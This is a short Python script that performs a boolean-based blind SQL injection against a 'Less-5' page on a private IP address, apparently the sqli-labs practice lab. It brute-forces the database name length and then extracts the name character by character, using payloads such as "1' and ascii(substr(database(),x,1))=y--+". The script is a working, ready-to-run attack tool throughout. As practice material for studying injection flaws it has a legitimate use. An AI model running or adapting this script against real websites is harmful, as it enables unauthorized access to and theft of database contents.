import requests

print('for database length')
for i in range(100):
      url="http://192.168.239.49/Less-5/?id=1'and length(database())={}--+".format(i)
      resp=requests.get(url)
      str2=resp.content.decode()
      if "You are in" in str2:
        print("database length is {}\n\n".format(i))
        break
cont=i
print('<-guess database name-->')
print("The injection statement is ---> 1' and ascii(substr(database(),x,1))=y--+ ")
database_name=''
for i in range(1,cont+1):
        for j in range(65,123):
            sql =f"http://192.168.239.49/Less-5/?id=-1 'or ascii(substr(database(),{i},1))={j} --+"
            res=requests.get(sql)
            str=res.content.decode()
            if "You" in str:
                print(f"the{i}char is   "+ chr(j))
                database_name += chr(j)
print(f'数据库名称为:{database_name}\n\n')

#http://192.168.116.49/Less-5/?id=-1 'or ascii(substr(database(), 1,1))=115 --+
